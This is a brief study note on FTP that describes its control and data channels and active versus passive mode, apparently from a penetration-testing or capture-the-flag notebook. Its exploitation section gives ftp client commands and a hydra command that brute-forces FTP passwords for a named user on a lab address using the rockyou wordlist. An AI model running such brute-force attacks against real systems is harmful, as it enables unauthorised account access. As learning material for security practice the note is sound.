# FTP
## File Transfer Protocol

Allows remote transfer of files over a network. Uses a client-server model.

Operates on two channels:
* a command/control channel
* a data channel

### Active vs Passive

* In an Active FTP connection,  the client opens a port and listens. The server is required to actively connect to it
* In a Passive FTP connection, the server opens a port and listens (passively) and the client connects to it.

### Exploitation

```bash
ftp [ip]
```

```bash
get [file]
```

```bash
hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp
```

